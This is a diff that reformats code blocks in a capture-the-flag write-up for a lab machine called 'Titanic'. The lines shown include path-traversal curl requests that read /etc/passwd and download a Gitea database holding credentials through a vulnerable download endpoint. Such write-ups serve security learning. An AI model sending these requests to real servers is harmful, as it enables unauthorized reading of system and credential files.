@@ -49,8 +49,8 @@ Accessing http://titanic.htb, we find a simple website. An interesting endpoint 
 We test for LFI by replacing rand-id.json with ../../../../etc/passwd:
 
 bash
-Copy
-curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
+```Copy
+curl "http://titanic.htb/download?ticket=../../../../etc/passwd"```
 Result:
 
 plaintext
@@ -73,9 +73,9 @@ flask-app: Flask application code.
 2. Extracting the Gitea Database 🗃️
 Using the LFI, we extract the Gitea database:
 
-bash
+```bash
 Copy
-curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
+curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db```
 We open the database with SQLite:
 
 bash
